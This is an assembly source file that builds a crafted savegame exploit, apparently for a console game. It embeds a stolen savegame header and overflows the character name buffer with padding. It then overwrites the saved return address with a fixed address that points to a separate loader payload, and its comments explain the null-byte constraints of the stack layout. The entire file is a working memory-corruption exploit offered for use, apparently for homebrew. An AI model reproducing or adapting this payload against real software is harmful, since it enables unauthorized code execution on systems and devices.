# Copyright      2011  Bernhard Urban <lewurm@gmail.com>
# This code is licensed to you under the terms of the GNU GPL, version 2;
# see file COPYING or http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt

	retadr = 0x90394140
0:
	# stolen from some savegame found in teh intertube
	.incbin "head.b"

	# give the char a name
	.ascii "you won't see this  " # len = 0x14

	# smash it \o/ 0x1f0+0x4 bytes all in all...
	.fill (0xf4/4), 4, 0x11111111

	# unlock the character (somewhere here actually...)
	.fill (0x10/4), 4, 0x90c10104

	# add more padding...
	.fill (0xdc/4), 4, 0x11111111

	# now we at the actual vuln return address
	# just point to the loader of the loader (= content of exploit.s)
	.long retadr

	# alternatively you can put the code here too and jump into the stack,
	# however then you have to take care for nullbytes in the resulting
	# bytecode, which is a way too tedious. so we just take the further slot for
	# it :-) (LEGO devs are nice ppl, heh)

	.fill 0x10000 - (. - 0b)
